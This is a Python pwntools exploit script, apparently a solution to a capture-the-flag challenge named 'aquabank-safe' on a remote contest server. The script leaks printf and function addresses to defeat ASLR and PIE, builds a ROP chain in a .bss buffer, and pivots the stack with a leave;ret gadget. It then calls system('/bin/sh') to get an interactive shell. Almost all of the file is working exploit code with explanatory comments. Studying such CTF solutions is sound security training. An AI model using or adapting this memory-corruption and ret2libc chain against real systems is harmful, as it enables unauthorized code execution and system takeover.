from pwn import *
#context.log_level = 'debug'

context.binary = elf = ELF('./aquabank-safe', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

#p = process('./aquabank-safe')
p = remote('offsec.m0lecon.it', 13541)

# diagnostics function give us two useful addresses: the address of printf in the libc and the address of the diagnostics function in the binary. Even though PIE and ASLR are enabled,
# with these two addresses we can calculate the base address of the libc and the base address of the binary, which will allow us to calculate the address of the system function in the 
#libc and the address of the win function in the binary.

# we don't have enough space to write a ROP chain. but we can illude the program that the vault is the stack. we can do this with stack pivoting. to do so, we need to overwrite the 
# base pointer, and also the RIP.

OFFSET_TO_RIP = 16 # this is the rip of the open_safe vault.

printf_libc = libc.symbols.printf
diagnostics_function = elf.symbols.diagnostics

print(f'printf_libc: {hex(printf_libc)}')
print(f'diagnostics_function: {hex(diagnostics_function)}')

p.recvuntil(b'> ')
p.sendline(b'1') # choose diagnostics function
leaked_printf = p.recvline().split()[3].decode()
print(f'leaked_printf: {leaked_printf}')

leaked_diagnostics = p.recvline().split()[3].decode()

libc.address = int(leaked_printf, 16) - printf_libc
elf.address = int(leaked_diagnostics, 16) - diagnostics_function

print(f'libc base address: {hex(libc.address)}')
print(f'binary base address: {hex(elf.address)}')

vault_address = elf.symbols.vault

# rop chain to be inserted inside the vault. we have to notice that the first 8 bytes will be inserted inside the RBP, because we popped it with the leave; instruction
rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address
ret = rop_libc.find_gadget(['ret']).address
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols.system

# Remember that the stack grows downwards toward lower memory addresses.
# When your leave gadget executes, the Stack Pointer (RSP) is teleported to 0x555b15cfb0a0.
# Because you are sitting at the absolute bottom edge of the vault, subtracting from RSP pushes the stack out of the .bss 
# section and backwards into a memory region that is either read-only or completely unmapped. Instant Segfault!

pivot_offset = 0x600

vault_payload = flat(
    b'\x00' * pivot_offset, # Pad the vault so our ROP chain sits in the middle!
    b'A' * 8,               # Dummy RBP 
    ret,
    pop_rdi,
    binsh,
    system
)

p.recvuntil(b'> ')
p.sendline(b'2') # choose open_safe vault
p.recvuntil(b'(bytes): ')
p.sendline(str(len(vault_payload)).encode()) # send the length of the payload
p.recvuntil(b'bytes:')
p.send(vault_payload) # send the payload to be inserted inside the vault

print(f'vault payload length: {len(vault_payload)}')

# we need a payload to send to the open_safe vault. this payload will overwrite the base pointer and the RIP. we will set the base pointer to the address of the vault,
#  and the RIP to the address of the leave; ret gadget.
leave_ret = rop_libc.find_gadget(['leave', 'ret']).address

payload = flat(
    b'A' * 8, 
    vault_address + pivot_offset, # Pivot RSP to the middle of the vault
    leave_ret 
)

p.recvuntil(b'> ')
p.sendline(b'3') # choose open_safe vault
p.recvuntil(b'combination:')
p.send(payload) # send the payload to overwrite the base pointer and the RIP

p.interactive()
